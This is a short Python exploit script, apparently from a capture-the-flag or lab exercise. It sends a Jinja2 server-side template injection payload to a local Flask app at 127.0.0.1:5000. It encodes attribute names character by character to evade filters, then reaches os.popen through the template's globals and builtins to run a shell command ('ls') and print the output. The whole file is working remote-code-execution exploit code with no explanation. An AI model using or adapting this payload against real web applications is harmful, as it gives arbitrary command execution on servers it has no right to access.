import requests

def f(s):
    res = ""
    for i in s:
        res += f"(lipsum()|urlencode|first%2blipsum|pprint|first|urlencode|last|lower)|format({ord(i)})"
        res += "~"
    res = res[:-1]
    return res

url = "http://127.0.0.1:5000/?message="
payload = "request|attr('application')"
cmd = f('ls')
payload = f"request|attr({f('application')})|attr({f('__globals__')})|attr({f('__getitem__')})({f('__builtins__')})|attr({f('__getitem__')})({f('__import__')})({f('os')})|attr({f('popen')})({cmd})|attr({f('read')})()"


res = requests.get(url+"{{" + payload + "}}")
print(res.text)
